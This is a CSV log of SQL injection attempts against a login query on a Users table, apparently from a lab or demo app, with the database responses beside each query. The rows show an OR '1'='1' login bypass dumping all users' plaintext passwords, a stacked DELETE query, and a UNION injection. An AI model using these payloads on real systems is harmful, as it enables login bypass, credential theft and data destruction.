Query,Response
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"}]
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='' and password=''OR'1'='1', [{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"},{"uid":"5fde76b931639e0610f466er","username":"shourav","password":"123456"},{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466ere","username":"brishty","password":"12345"},{"uid":"5fde76b931639e0610f466fa","username":"shachi","password":"123456789"}]
select * from Users where username='sajid' and password='123456'; delete from Users where username = 'shachi', undefined
select * from Users where username='admin' UNION select * from users  WHERE username='sajid'-- '' and password='lel', [{"uid":"5fde76b931639e0610f46444","username":"admin","password":"123"},{"uid":"5fde76b931639e0610f466fa","username":"sajid","password":"123456"}]
select * from Users where username='sajid' and password='12345', []
select * from Users where username='sajid576' and password='123456', []
